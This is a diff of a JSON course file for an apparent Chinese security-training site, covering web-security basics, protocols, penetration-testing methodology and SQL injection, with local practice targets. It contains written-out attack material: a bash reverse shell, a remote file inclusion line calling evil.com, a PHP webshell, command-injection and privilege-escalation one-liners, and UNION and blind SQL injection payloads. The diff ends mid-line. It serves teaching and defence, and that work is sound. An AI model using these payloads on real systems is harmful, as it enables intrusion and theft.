@@ -3,59 +3,194 @@
     {
       "id": 1,
       "title": "Web 安全入门",
-      "description": "面向新手的 Web 安全入门课程，涵盖常见漏洞概念与实战练习。",
+      "description": "从零开始理解 Web 安全，掌握常见漏洞原理与实战技巧。",
       "status": "published",
       "chapters": [
         {
           "id": 1,
           "course_id": 1,
-          "title": "第一章：Web 安全基础概念",
+          "title": "第一章：Web 安全基础",
           "order": 1,
-          "content": "# Web 安全基础概念\n\nWeb 安全是网络安全的重要分支，关注 Web 应用的常见漏洞与防御方法。\n\n## 常见威胁\n\n- **SQL 注入**：攻击者构造恶意输入干扰后端 SQL 语句。\n- **XSS（跨站脚本）**：向页面注入恶意脚本并在其他用户浏览器执行。\n- **CSRF（跨站请求伪造）**：诱导已登录用户在不知情下发起请求。\n\n## 学习目标\n\n1. 理解 HTTP 请求与响应结构。\n2. 掌握常见漏洞的成因与利用方式。\n3. 能够在靶机环境中复现并验证漏洞。\n\n> 提示：完成本章后，请在靶机列表启动「示例：Nginx Flag 查找」进行第一次实战练习。\n"
+          "content": "# Web 安全基础\n\nWeb 安全关注 Web 应用的漏洞发现、利用与防御。\n\n## 三大核心威胁\n\n- **注入类**：SQL 注入、命令注入、LDAP 注入\n- **跨站类**：XSS（存储/反射/DOM）、CSRF\n- **认证类**：弱口令、会话劫持、权限绕过\n\n## 学习路径\n\n1. 理解 HTTP 请求/响应结构\n2. 掌握浏览器开发者工具（F12）\n3. 学会使用 Burp Suite / curl 构造请求\n4. 在靶机环境复现漏洞\n\n> 实战：启动本地靶机 `python target1_nginx.py 8081`，访问 `http://localhost:8081` 开始练习。\n"
         },
         {
           "id": 2,
           "course_id": 1,
-          "title": "第二章：信息搜集与 Flag 查找",
+          "title": "第二章：HTTP 协议与请求构造",
           "order": 2,
-          "content": "# 信息搜集与 Flag 查找\n\n在 CTF 与渗透测试中，Flag 通常隐藏在页面源码、响应头或服务端口中。\n\n## 查找技巧\n\n1. 查看页面 HTML 源码，留意注释 `<!-- ... -->`。\n2. 检查 HTTP 响应头与 Cookie。\n3. 使用 `curl`、`dirsearch` 等工具枚举隐藏路径。\n\n## 示例\n\n访问靶机首页后，按 `Ctrl+U` 查看源代码，留意页面中是否藏有形如\n`flag{...}` 的字符串。\n"
+          "content": "# HTTP 协议与请求构造\n\nHTTP 是 Web 安全的核心协议，理解其结构是攻击的前提。\n\n## 请求结构\n\n```\nGET /admin HTTP/1.1\nHost: localhost:8081\nUser-Agent: Mozilla/5.0\nCookie: session=abc123\n```\n\n## 关键要素\n\n- **方法**：GET（获取）、POST（提交）、PUT（更新）、DELETE（删除）\n- **头部**：Host、Cookie、Authorization、Content-Type\n- **正文**：POST 请求的参数数据\n\n## 工具实战\n\n```bash\n# curl 发送 GET 请求\ncurl http://localhost:8081/\n\n# curl 发送 POST 请求\ncurl -X POST -d \"username=admin&password=123\" http://localhost:8081/login\n\n# 查看响应头\ncurl -I http://localhost:8081/\n```\n"
+        },
+        {
+          "id": 3,
+          "course_id": 1,
+          "title": "第三章：信息搜集技术",
+          "order": 3,
+          "content": "# 信息搜集技术\n\n渗透测试第一步：收集目标信息，发现攻击面。\n\n## 被动搜集（不直接接触目标）\n\n- **WHOIS**：查询域名注册信息\n- **子域名枚举**：subdomain3、Amass\n- **搜索引擎**：Google Hacking（`site:target.com filetype:sql`）\n- **Shodan**：搜索联网设备（`apache 2.4.49 country:CN`）\n\n## 主动搜集（直接接触目标）\n\n- **端口扫描**：nmap -sV target.com\n- **目录枚举**：dirsearch -u http://target.com\n- **服务识别**：nmap -A target.com\n\n## 靶机实战\n\n启动靶机后，用 `curl -I http://localhost:8081` 查看响应头，用浏览器 `Ctrl+U` 查看源码，寻找隐藏信息。\n"
+        },
+        {
+          "id": 4,
+          "course_id": 1,
+          "title": "第四章：常见漏洞类型",
+          "order": 4,
+          "content": "# 常见漏洞类型\n\n## 注入漏洞\n\n- **SQL 注入**：`' OR 1=1 --` 绕过认证\n- **命令注入**：`; cat /etc/passwd` 执行系统命令\n- **代码注入**：`<?php system($_GET['cmd']); ?>`\n\n## 跨站脚本（XSS）\n\n- **反射型**：URL 参数注入，`?search=<script>alert(1)</script>`\n- **存储型**：评论内容存入数据库，所有用户加载时执行\n- **DOM 型**：前端 JS 直接操作 DOM，`document.write(location.hash)`\n\n## 认证与授权\n\n- **弱口令**：admin/123456、root/root\n- **越权**：普通用户访问 `/admin` 路径\n- **会话劫持**：窃取 Cookie 中的 session_id\n\n## 文件操作\n\n- **路径遍历**：`../../etc/passwd` 读取敏感文件\n- **文件上传**：上传 `.php` 后门文件\n- **文件包含**：`?file=../../config.php` 包含恶意文件\n"
+        },
+        {
+          "id": 5,
+          "course_id": 1,
+          "title": "第五章：靶机实战入门",
+          "order": 5,
+          "content": "# 靶机实战入门\n\n## 环境准备\n\n```bash\n# 下载项目\ngit clone https://github.com/fsywed/net_learn.git\ncd net_learn/targets/local\n\n# 启动 4 个靶机（纯 Python，无需 Docker）\npython target1_nginx.py 8081 &\npython target2_ssh.py 8082 &\npython target3_sqli.py 8083 &\npython target4_xss.py 8084 &\n```\n\n## 靶机说明\n\n| 靶机 | 端口 | 漏洞类型 | 难度 |\n|---|---|---|---|\n| target1 | 8081 | Nginx Flag 隐藏 | 简单 |\n| target2 | 8082 | SSH 弱口令 | 简单 |\n| target3 | 8083 | SQL 注入 | 中等 |\n| target4 | 8084 | XSS 反射型 | 中等 |\n\n## 实战流程\n\n1. 访问 `http://localhost:8081`\n2. 查看页面源码（`Ctrl+U`），寻找 Flag\n3. 在网站首页提交 Flag 验证\n\n> 提示：Flag 格式为 `flag{...}`，可能藏在 HTML 注释、响应头或隐藏文件中。\n"
         }
       ]
     },
     {
       "id": 2,
       "title": "网络协议基础",
-      "description": "从 TCP/IP 到 HTTP，理解每一次请求背后的网络协议交互。",
+      "description": "深入理解 TCP/IP、HTTP、DNS 等核心协议，掌握网络通信原理。",
       "status": "published",
       "chapters": [
         {
-          "id": 3,
+          "id": 6,
           "course_id": 2,
           "title": "第一章：OSI 与 TCP/IP 模型",
           "order": 1,
-          "content": "# OSI 与 TCP/IP 模型\n\n理解网络通信的分层模型是学习安全的基础。\n\n## 核心概念\n\n- 应用层（HTTP / DNS / FTP）\n- 传输层（TCP / UDP）\n- 网络层（IP）\n- 链路层（以太网 / Wi-Fi）\n\n## 实战工具\n\n- `wireshark` 抓包分析\n- `tcpdump` 命令行抓包\n- `netstat` 查看连接\n"
+          "content": "# OSI 与 TCP/IP 模型\n\n网络通信的分层模型，每层负责特定功能。\n\n## OSI 七层模型\n\n| 层级 | 功能 | 协议示例 |\n|---|---|---|\n| 应用层 | 用户接口 | HTTP、FTP、DNS、SMTP |\n| 表示层 | 数据格式转换 | SSL/TLS、JPEG、ASCII |\n| 会话层 | 会话管理 | NetBIOS、RPC |\n| 传输层 | 端到端通信 | TCP、UDP |\n| 网络层 | 路由选择 | IP、ICMP、ARP |\n| 数据链路层 | 帧传输 | Ethernet、PPP |\n| 物理层 | 比特流传输 | 光纤、双绞线 |\n\n## TCP/IP 四层模型（实际使用）\n\n- **应用层** = OSI 应用层 + 表示层 + 会话层\n- **传输层** = TCP/UDP\n- **网络层** = IP\n- **网络接口层** = 数据链路层 + 物理层\n\n## 数据封装过程\n\n```\n应用数据 → TCP 头 + 数据 → IP 头 + TCP + 数据 → 帧头 + IP + TCP + 数据\n```\n"
         },
         {
-          "id": 4,
+          "id": 7,
           "course_id": 2,
-          "title": "第二章：HTTP 协议详解",
+          "title": "第二章：TCP 与 UDP 协议",
           "order": 2,
-          "content": "# HTTP 协议详解\n\nHTTP 是 Web 安全的核心协议。\n\n## 请求结构\n\n```\nGET /index.html HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n```\n\n## 常用方法\n\n- GET / POST / PUT / DELETE\n- OPTIONS 预检请求\n- HEAD 仅获取响应头\n"
+          "content": "# TCP 与 UDP 协议\n\n传输层两大协议，各有适用场景。\n\n## TCP（传输控制协议）\n\n**特点**：面向连接、可靠、有序、流量控制\n\n**三次握手**：\n1. 客户端 → SYN → 服务端\n2. 服务端 → SYN+ACK → 客户端\n3. 客户端 → ACK → 服务端\n\n**四次挥手**：\n1. 客户端 → FIN → 服务端（请求断开）\n2. 服务端 → ACK → 客户端（确认）\n3. 服务端 → FIN → 客户端（准备断开）\n4. 客户端 → ACK → 服务端（确认）\n\n**适用场景**：HTTP、FTP、SSH、邮件\n\n## UDP（用户数据报协议）\n\n**特点**：无连接、不可靠、快速、支持广播\n\n**适用场景**：DNS、视频流、游戏、VoIP\n\n## 实战命令\n\n```bash\n# 查看 TCP 连接\nnetstat -antp\n\n# 查看监听端口\nss -tlnp\n\n# 测试 TCP 连接\nnc -zv localhost 80\n```\n"
+        },
+        {
+          "id": 8,
+          "course_id": 2,
+          "title": "第三章：HTTP/HTTPS 协议",
+          "order": 3,
+          "content": "# HTTP/HTTPS 协议\n\nWeb 安全的核心协议。\n\n## HTTP 请求方法\n\n| 方法 | 用途 | 幂等性 |\n|---|---|---|\n| GET | 获取资源 | 是 |\n| POST | 提交数据 | 否 |\n| PUT | 更新资源 | 是 |\n| DELETE | 删除资源 | 是 |\n| HEAD | 获取响应头 | 是 |\n| OPTIONS | 查询支持的方法 | 是 |\n\n## HTTP 状态码\n\n- **2xx 成功**：200 OK、201 Created、204 No Content\n- **3xx 重定向**：301 永久、302 临时、304 未修改\n- **4xx 客户端错误**：400 请求错误、401 未认证、403 禁止、404 未找到\n- **5xx 服务器错误**：500 内部错误、502 网关错误、503 服务不可用\n\n## HTTPS（HTTP + TLS）\n\n**加密过程**：\n1. 客户端发起 TLS 握手\n2. 服务端返回证书（含公钥）\n3. 客户端验证证书，生成对称密钥\n4. 用公钥加密对称密钥，发送给服务端\n5. 双方用对称密钥加密通信\n\n**安全要点**：\n- 证书由 CA 签发\n- 防止中间人攻击\n- 端口 443（HTTP 是 80）\n"
+        },
+        {
+          "id": 9,
+          "course_id": 2,
+          "title": "第四章：DNS 协议与攻击",
+          "order": 4,
+          "content": "# DNS 协议与攻击\n\n域名系统（Domain Name System），将域名解析为 IP 地址。\n\n## DNS 查询过程\n\n1. 浏览器缓存 → 2. 系统缓存 → 3. 本地 DNS 服务器 → 4. 根域名服务器 → 5. 顶级域名服务器 → 6. 权威域名服务器\n\n## DNS 记录类型\n\n| 类型 | 用途 | 示例 |\n|---|---|---|\n| A | IPv4 地址 | example.com → 93.184.216.34 |\n| AAAA | IPv6 地址 | example.com → 2606:2800:220:1:... |\n| CNAME | 别名 | www.example.com → example.com |\n| MX | 邮件服务器 | example.com → mail.example.com |\n| TXT | 文本信息（SPF、DKIM） | `v=spf1 include:_spf.google.com ~all` |\n| NS | 权威域名服务器 | example.com → ns1.example.com |\n\n## DNS 攻击\n\n**DNS 劫持**：\n- 修改 DNS 服务器指向\n- 返回虚假 IP 地址\n- 用户访问钓鱼网站\n\n**DNS 缓存投毒**：\n- 向 DNS 服务器注入虚假记录\n- 污染缓存，影响所有用户\n\n**DNS 隧道**：\n- 利用 DNS 查询传输数据\n- 绕过防火墙检测\n- 工具：dnscat2、iodine\n\n## 实战命令\n\n```bash\n# 查询域名 IP\ndig example.com\nnslookup example.com\n\n# 查询特定记录\ndig example.com MX\ndig example.com TXT\n\n# 指定 DNS 服务器\ndig @8.8.8.8 example.com\n```\n"
         }
       ]
     },
     {
       "id": 3,
       "title": "渗透测试方法论",
-      "description": "系统化学习渗透测试的阶段划分、工具链与报告撰写。",
+      "description": "系统化掌握渗透测试流程：信息搜集、漏洞利用、权限提升、报告撰写。",
       "status": "published",
       "chapters": [
         {
-          "id": 5,
+          "id": 10,
           "course_id": 3,
           "title": "第一章：渗透测试五阶段",
           "order": 1,
-          "content": "# 渗透测试五阶段\n\n1. **情报搜集**：被动信息收集（whois、shodan、google dork）\n2. **扫描探测**：端口扫描、服务识别、漏洞扫描\n3. **漏洞利用**：根据识别出的漏洞尝试获取权限\n4. **权限提升**：从普通用户提升到管理员\n5. **报告撰写**：整理发现、复现步骤、修复建议\n"
+          "content": "# 渗透测试五阶段\n\n## 1. 情报搜集（Reconnaissance）\n\n**被动搜集**（不接触目标）：\n- WHOIS 查询域名信息\n- 搜索引擎：`site:target.com filetype:pdf`\n- Shodan：`apache 2.4.49 country:CN`\n- 社交媒体：LinkedIn、GitHub\n\n**主动搜集**（接触目标）：\n- 子域名枚举：subdomain3、Amass\n- 端口扫描：nmap -sV target.com\n- 技术栈识别：Wappalyzer、BuiltWith\n\n## 2. 扫描探测（Scanning）\n\n- **端口扫描**：nmap -p- target.com（全端口）\n- **服务识别**：nmap -sV（版本检测）\n- **漏洞扫描**：Nessus、OpenVAS、Nikto\n- **目录枚举**：dirsearch、gobuster\n\n## 3. 漏洞利用（Exploitation）\n\n- 根据扫描结果选择漏洞\n- 使用 Metasploit、searchsploit 查找利用代码\n- 手动构造 Payload（SQL 注入、XSS）\n- 获取初始访问权限（shell、webshell）\n\n## 4. 权限提升（Privilege Escalation）\n\n**垂直提权**（普通用户 → 管理员）：\n- Linux：SUID、sudo 配置错误、内核漏洞\n- Windows：服务配置错误、注册表权限\n\n**水平提权**（同级别用户 A → 用户 B）：\n- 共享文件权限\n- 会话劫持\n\n## 5. 报告撰写（Reporting）\n\n**报告结构**：\n1. 执行摘要（给管理层）\n2. 技术细节（给开发人员）\n3. 漏洞列表（严重性、CVSS 评分）\n4. 复现步骤（截图、命令）\n5. 修复建议（优先级排序）\n"
+        },
+        {
+          "id": 11,
+          "course_id": 3,
+          "title": "第二章：信息搜集技术",
+          "order": 2,
+          "content": "# 信息搜集技术\n\n## 被动信息搜集\n\n**WHOIS 查询**：\n```bash\nwhois example.com\n# 获取注册人、注册商、DNS 服务器\n```\n\n**搜索引擎 Hacking**：\n```\nsite:example.com           # 仅搜索该域名\nfiletype:pdf               # 搜索 PDF 文件\ninurl:admin                # URL 包含 admin\nintitle:\"index of\"         # 目录列表\n\"password\" filetype:sql    # 泄露的数据库文件\n```\n\n**Shodan 搜索**：\n```\napache 2.4.49              # 特定版本\nport:22 country:CN         # 中国 SSH 服务\nopenssl 1.0.1              # 存在 Heartbleed 的主机\n```\n\n## 主动信息搜集\n\n**子域名枚举**：\n```bash\n# subdomain3\npython3 subdomain3.py -d example.com\n\n# Amass\namass enum -d example.com\n```\n\n**端口扫描**：\n```bash\n# 快速扫描常用端口\nnmap target.com\n\n# 全端口扫描\nnmap -p- target.com\n\n# 服务版本检测\nnmap -sV target.com\n\n# 操作系统检测\nnmap -O target.com\n\n# 综合扫描（推荐）\nnmap -A target.com\n```\n\n**目录枚举**：\n```bash\n# dirsearch\ndirsearch -u http://target.com -e php,html,js\n\n# gobuster\ngobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt\n```\n\n## 技术栈识别\n\n- **Wappalyzer**：浏览器插件，识别 CMS、框架、服务器\n- **BuiltWith**：在线工具，分析网站技术栈\n- **查看响应头**：`curl -I http://target.com`\n"
+        },
+        {
+          "id": 12,
+          "course_id": 3,
+          "title": "第三章：漏洞扫描与利用",
+          "order": 3,
+          "content": "# 漏洞扫描与利用\n\n## 漏洞扫描工具\n\n**Nikto（Web 漏洞扫描）**：\n```bash\nnikto -h http://target.com\n# 检测：危险文件、过时软件、服务器配置问题\n```\n\n**Nessus（综合漏洞扫描）**：\n- 图形界面，支持插件\n- 检测：系统漏洞、配置错误、默认口令\n\n**OpenVAS（开源替代）**：\n- 功能类似 Nessus\n- 完全免费开源\n\n## 漏洞利用框架\n\n**Metasploit**：\n```bash\n# 启动 msfconsole\nmsfconsole\n\n# 搜索漏洞利用\nsearch apache 2.4.49\n\n# 选择利用模块\nuse exploit/unix/http/apache_normalize_path_rce\n\n# 设置参数\nset RHOSTS target.com\nset LHOST your_ip\n\n# 执行\nexploit\n```\n\n**searchsploit（本地漏洞库）**：\n```bash\n# 搜索漏洞\nsearchsploit apache 2.4.49\n\n# 查看利用代码\nsearchsploit -x 50570\n```\n\n## 手动漏洞利用\n\n**SQL 注入**：\n```bash\n# 测试注入点\ncurl \"http://target.com/login?username=admin'--&password=123\"\n\n# 联合查询获取数据\ncurl \"http://target.com/page?id=1 UNION SELECT 1,2,3--\"\n```\n\n**命令注入**：\n```bash\n# 测试注入\ncurl \"http://target.com/ping?ip=127.0.0.1;cat /etc/passwd\"\n```\n\n**文件包含**：\n```bash\n# 本地文件包含\ncurl \"http://target.com/page?file=../../../etc/passwd\"\n\n# 远程文件包含\ncurl \"http://target.com/page?file=http://evil.com/shell.php\"\n```\n\n## 获取 Shell\n\n**反弹 Shell**：\n```bash\n# 目标机执行（bash）\nbash -i >& /dev/tcp/your_ip/4444 0>&1\n\n# 你的机器监听\nnc -lvnp 4444\n```\n\n**Webshell**：\n```php\n<?php system($_GET['cmd']); ?>\n# 访问：http://target.com/shell.php?cmd=whoami\n```\n"
+        },
+        {
+          "id": 13,
+          "course_id": 3,
+          "title": "第四章：权限提升",
+          "order": 4,
+          "content": "# 权限提升\n\n获取初始访问后，通常需要提权到更高权限。\n\n## Linux 提权\n\n**信息收集**：\n```bash\n# 系统信息\nuname -a\ncat /etc/os-release\n\n# 当前用户\nid\nwhoami\n\n# SUID 文件（可能提权）\nfind / -perm -4000 2>/dev/null\n\n# sudo 权限\nsudo -l\n\n# 可写目录\nfind / -writable -type d 2>/dev/null\n```\n\n**SUID 提权**：\n```bash\n# 查找 SUID 文件\nfind / -perm -4000 -type f 2>/dev/null\n\n# 检查 GTFOBins（https://gtfobins.github.io/）\n# 例如：find 命令 SUID\nfind . -exec /bin/sh -p \\; -quit\n```\n\n**sudo 配置错误**：\n```bash\n# 查看 sudo 权限\nsudo -l\n\n# 如果允许执行特定命令\nsudo /bin/bash\nsudo vim -c ':!/bin/bash'\n```\n\n**内核漏洞提权**：\n```bash\n# 查看内核版本\nuname -r\n\n# 搜索漏洞利用\nsearchsploit linux kernel 4.15\n```\n\n## Windows 提权\n\n**信息收集**：\n```cmd\n:: 系统信息\nsysteminfo\nver\n\n:: 当前用户\nwhoami\nnet user %username%\n\n:: 服务列表\nsc query\nnet start\n\n:: 补丁列表\nwmic qfe get\n```\n\n**服务配置错误**：\n```cmd\n:: 查找可写服务\naccesschk.exe /accepteula -uwdq C:\\\n\n:: 替换服务二进制文件\nsc stop vuln_service\ncopy malicious.exe C:\\path\\to\\service.exe\nsc start vuln_service\n```\n\n**注册表权限**：\n```cmd\n:: 检查自动启动项\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\n:: 如果可写，替换为恶意程序\n```\n\n## 自动化提权工具\n\n**Linux**：\n- LinEnum：https://github.com/rebootuser/LinEnum\n- linux-exploit-suggester：https://github.com/mzet-/linux-exploit-suggester\n- PEASS：https://github.com/carlospolop/PEASS-ng\n\n**Windows**：\n- WinPEAS：https://github.com/carlospolop/PEASS-ng\n- PowerUp：https://github.com/PowerShellMafia/PowerSploit\n- SharpUp：https://github.com/GhostPack/SharpUp\n"
+        },
+        {
+          "id": 14,
+          "course_id": 3,
+          "title": "第五章：报告撰写",
+          "order": 5,
+          "content": "# 渗透测试报告撰写\n\n报告是渗透测试的最终交付物，质量直接影响客户对工作的评价。\n\n## 报告结构\n\n### 1. 执行摘要（给管理层）\n\n**内容**：\n- 测试范围与目标\n- 发现的高危漏洞数量\n- 业务影响评估\n- 整体风险等级（高/中/低）\n- 修复优先级建议\n\n**示例**：\n> 本次测试发现 3 个高危漏洞、5 个中危漏洞、2 个低危漏洞。攻击者可利用 SQL 注入获取数据库访问权限，导致敏感数据泄露。建议立即修复高危漏洞，并在 30 天内完成中危漏洞修复。\n\n### 2. 技术细节（给开发人员）\n\n**每个漏洞包含**：\n- **漏洞名称**：SQL 注入 - 登录页面\n- **严重性**：高危（CVSS 9.8）\n- **漏洞位置**：`http://target.com/login`，参数 `username`\n- **复现步骤**：\n  1. 访问登录页面\n  2. 输入用户名 `admin' OR '1'='1`，密码任意\n  3. 成功登录管理员账户\n- **截图/视频**：证明漏洞存在\n- **影响**：攻击者可绕过认证，获取管理员权限\n\n### 3. 漏洞列表\n\n| 编号 | 漏洞名称 | 严重性 | CVSS | 状态 |\n|---|---|---|---|---|\n| 1 | SQL 注入 - 登录页面 | 高危 | 9.8 | 待修复 |\n| 2 | XSS 反射型 - 搜索框 | 中危 | 6.1 | 待修复 |\n| 3 | 目录遍历 - 文件下载 | 高危 | 7.5 | 待修复 |\n\n### 4. 修复建议\n\n**SQL 注入修复**：\n```python\n# 错误示例（存在注入）\nquery = f\"SELECT * FROM users WHERE username='{username}'\"\n\n# 正确示例（参数化查询）\ncursor.execute(\"SELECT * FROM users WHERE username=?\", (username,))\n```\n\n**XSS 修复**：\n```javascript\n// 错误示例（直接输出）\ndocument.getElementById(\"output\").innerHTML = userInput;\n\n// 正确示例（转义输出）\ndocument.getElementById(\"output\").textContent = userInput;\n```\n\n### 5. 附录\n\n- 测试工具清单\n- 测试时间线\n- 参考标准（OWASP Top 10、CWE）\n\n## 报告撰写原则\n\n1. **客观准确**：只陈述事实，不夸大风险\n2. **可复现**：步骤清晰，开发人员能复现\n3. **优先级明确**：按 CVSS 评分排序\n4. **修复可行**：建议具体，提供代码示例\n5. **语言简洁**：避免技术术语堆砌\n"
+        }
+      ]
+    },
+    {
+      "id": 4,
+      "title": "SQL 注入实战",
+      "description": "深入理解 SQL 注入原理，掌握联合查询、盲注、绕过技巧。",
+      "status": "published",
+      "chapters": [
+        {
+          "id": 15,
+          "course_id": 4,
+          "title": "第一章：SQL 注入原理",
+          "order": 1,
+          "content": "# SQL 注入原理\n\nSQL 注入是最危险的 Web 漏洞之一，攻击者通过构造恶意输入干扰后端 SQL 语句。\n\n## 注入成因\n\n**后端代码**（Python + SQLite 示例）：\n```python\n# 危险：直接拼接用户输入\nquery = f\"SELECT * FROM users WHERE username='{username}' AND password='{password}'\"\ncursor.execute(query)\n```\n\n**攻击输入**：\n```\nusername = admin' --\npassword = anything\n```\n\n**生成的 SQL**：\n```sql\nSELECT * FROM users WHERE username='admin' --' AND password='anything'\n```\n\n`--` 注释掉密码验证，成功登录。\n\n## 注入类型\n\n**按输入类型**：\n- **数字型**：`id=1 OR 1=1`\n- **字符型**：`username=admin' OR '1'='1`\n\n**按注入位置**：\n- **URL 参数**：`?id=1 UNION SELECT 1,2,3`\n- **表单输入**：登录框、搜索框\n- **HTTP 头部**：User-Agent、Cookie、X-Forwarded-For\n\n**按数据回显**：\n- **联合查询注入**：页面直接显示查询结果\n- **盲注**：页面无回显，需通过布尔/时间判断\n- **报错注入**：利用数据库报错信息\n\n## 靶机实战\n\n启动 SQL 注入靶机：\n```bash\npython target3_sqli.py 8083\n```\n\n访问 `http://localhost:8083`，尝试登录：\n- 用户名：`admin' --`\n- 密码：任意\n\n> 原理：`--` 注释掉后续 SQL，绕过密码验证。\n"
+        },
+        {
+          "id": 16,
+          "course_id": 4,
+          "title": "第二章：联合查询注入",
+          "order": 2,
+          "content": "# 联合查询注入\n\n当页面直接显示查询结果时，使用 `UNION SELECT` 提取数据。\n\n## 注入步骤\n\n### 1. 确定列数\n\n**方法 1：ORDER BY 猜解**\n```\n?id=1 ORDER BY 1--    # 正常\n?id=1 ORDER BY 2--    # 正常\n?id=1 ORDER BY 3--    # 报错 → 列数为 2\n```\n\n**方法 2：UNION SELECT 猜解**\n```\n?id=1 UNION SELECT 1--          # 报错（列数不匹配）\n?id=1 UNION SELECT 1,2--        # 正常（列数为 2）\n?id=1 UNION SELECT 1,2,3--      # 报错\n```\n\n### 2. 确定回显位置\n\n```\n?id=0 UNION SELECT 1,2--\n# 页面显示 1 和 2，记录位置\n```\n\n### 3. 获取数据库信息\n\n**SQLite**：\n```sql\n# 获取表名\n?id=0 UNION SELECT 1,group_concat(name) FROM sqlite_master WHERE type='table'--\n# 结果：users,products,orders\n\n# 获取列名（假设表名为 users）\n?id=0 UNION SELECT 1,group_concat(sql) FROM sqlite_master WHERE type='table' AND name='users'--\n# 结果：CREATE TABLE users(id INTEGER, username TEXT, password TEXT)\n```\n\n**MySQL**：\n```sql\n# 获取当前数据库\n?id=0 UNION SELECT 1,database()--\n\n# 获取所有表\n?id=0 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--\n\n# 获取列名\n?id=0 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--\n```\n\n### 4. 提取数据\n\n```sql\n# 获取用户名和密码\n?id=0 UNION SELECT 1,group_concat(username,':',password) FROM users--\n# 结果：admin:admin123,user1:password1\n```\n\n## 靶机实战\n\n启动靶机：\n```bash\npython target3_sqli.py 8083\n```\n\n访问 `http://localhost:8083`，在搜索框尝试：\n1. 输入 `1` → 显示 ID 为 1 的内容\n2. 输入 `0 UNION SELECT 1,2` → 确定列数\n3. 输入 `0 UNION SELECT 1,group_concat(name) FROM sqlite_master WHERE type='table'` → 获取表名\n4. 提取 Flag\n\n> 提示：Flag 可能藏在某个表的字段中。\n"
+        },
+        {
+          "id": 17,
+          "course_id": 4,
+          "title": "第三章：盲注技术",
+          "order": 3,
+          "content": "# 盲注技术\n\n当页面无回显或回显固定时，通过布尔判断或时间延迟提取数据。\n\n## 布尔盲注\n\n页面只有两种状态：正常（True）/ 异常（False）。\n\n**逐字符猜解**：\n```sql\n# 猜解数据库名第一个字符\n?id=1 AND substring(database(),1,1)='a'--    # False\n?id=1 AND substring(database(),1,1)='b'--    # False\n?id=1 AND substring(database(),1,1)='s'--    # True → 第一个字符是 's'\n\n# 猜解第二个字符\n?id=1 AND substring(database(),2,1)='q'--    # True → 第二个字符是 'q'\n```\n\n**二分法优化**：\n```sql\n# 判断第一个字符 ASCII 是否大于 100\n?id=1 AND ascii(substring(database(),1,1))>100--    # True\n?id=1 AND ascii(substring(database(),1,1))>150--    # False\n?id=1 AND ascii(substring(database(),1,1))>125--    # True\n# 逐步缩小范围，最终确定字符\n```\n\n## 时间盲注\n\n页面无任何变化，通过响应时间判断。\n\n**SQLite**：\n```sql\n# 如果条件为真，延迟 5 秒\n?id=1 AND 1=CASE WHEN substring(database(),1,1)='s' THEN randomblob(100000000) ELSE 1 END--\n```\n\n**MySQL**：\n```sql\n# 如果条件为真，sleep 5 秒\n?id=1 AND IF(substring(database(),1,1)='s',sleep(5),1)--\n```\n\n**PostgreSQL**：\n```sql\n# 如果条件为真，pg_sleep 5 秒\n?id=1 AND CASE WHEN substring(database(),1,1)='s' THEN pg_sleep(5) ELSE 1 END--\n```\n\n## 自动化盲注工具\n\n**sqlmap**：\n```bash\n# 自动检测注入点\nsqlmap -u \"http://target.com/page?id=1\"\n\n# 提取数据库名\nsqlmap -u \"http://target.com/page?id=1\" --dbs\n\n# 提取表名\nsqlmap -u \"http://target.com/page?id=1\" -D target_db --tables\n\n# 提取数据\nsqlmap -u \"http://target.com/page?id=1\" -D target_db -T users --dump\n```\n\n## 靶机实战\n\n启动靶机：\n```bash\npython target3_sqli.py 8083\n```\n\n如果联合查询被过滤，尝试盲注：\n1. 输入 `1 AND 1=1` → 页面正常\n2. 输入 `1 AND 1=2` → 页面无内容\n3. 使用布尔盲注逐字符猜解 Flag\n\n> 提示：编写 Python 脚本自动化猜解，手动太慢。\n"
+        },
+        {
+          "id": 18,
+          "course_id": 4,
+          "title": "第四章：防御与修复",
+          "order": 4,
+          "content": "# SQL 注入防御与修复\n\n## 防御方案\n\n### 1. 参数化查询（最佳实践）\n\n**Python + SQLite**：\n```python\n# 错误：字符串拼接\ncursor.execute(f\"SELECT * FROM users WHERE username='{username}'\")\n\n# 正确：参数化查询\ncursor.execute(\"SELECT * FROM users WHERE username=?\", (username,))\n```\n\n**Python + MySQL**：\n```python\ncursor.execute(\"SELECT * FROM users WHERE username=%s\", (username,))\n```\n\n**Java + JDBC**：\n```java\nPreparedStatement stmt = conn.prepareStatement(\"SELECT * FROM users WHERE username=?\");\nstmt.setString(1, username);\nResultSet rs = stmt.executeQuery();\n```\n\n**Node.js + MySQL**：\n```javascript\nconnection.execute('SELECT * FROM users WHERE username=?', [username]);\n```\n\n### 2. ORM 框架\n\n使用 SQLAlchemy、Django ORM、Hibernate 等 ORM，自动处理参数化。\n\n```python\n# SQLAlchemy\nuser = session.query(User).filter(User.username == username).first()\n```\n\n### 3. 输入验证\n\n**白名单验证**：\n```python\n# 只允许字母数字\nif not re.match(r'^[a-zA-Z0-9]+$', username):\n    raise ValueError(\"Invalid username\")\n```\n\n**类型转换**：\n```python\n# 强制转换为整数\nuser_id = int(request.args.get('id'))\n```\n\n### 4. 最小权限原则\n\n```sql\n-- 创建专用数据库用户，仅授予必要权限\nCREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';\nGRANT SELECT, INSERT, UPDATE ON target_db.* TO 'webapp'@'localhost';\n-- 不授予 DROP、DELETE、CREATE 等高危权限\n```\n\n### 5. WAF（Web 应用防火墙）\n\n**ModSecurity 规则示例**：\n```\nSecRule ARGS \"@rx (?i)(union.*select|select.*from)\" \"id:1001,deny,msg:'SQL Injection'\"\n```\n\n**云 WAF**：\n- Cloudflare WAF\n- 阿里云 WAF\n- 腾讯云 WAF\n\n### 6. 错误处理\n\n```python\ntry:\n    cursor.execute(query, params)\nexcept Exception as e:\n    # 不向用户暴露详细错误\n    logger.error(f\"Database error: {e}\")\n    return \"Internal server error\", 500\n```\n\n## 安全开发流程\n\n1. **代码审查**：检查所有 SQL 语句是否参数化\n2. **静态分析**：使用 SonarQube、Bandit 扫描代码\n3. **动态测试**：定期使用 sqlmap 测试\n4. **安全培训**：开发人员了解注入原理\n\n## 靶机实战\n\n修复靶机中的 SQL 注入漏洞：\n\n**修复前**（target3_sqli.py）：\n```python\nquery = f\"SELECT * FROM users WHERE username='{username}' AND 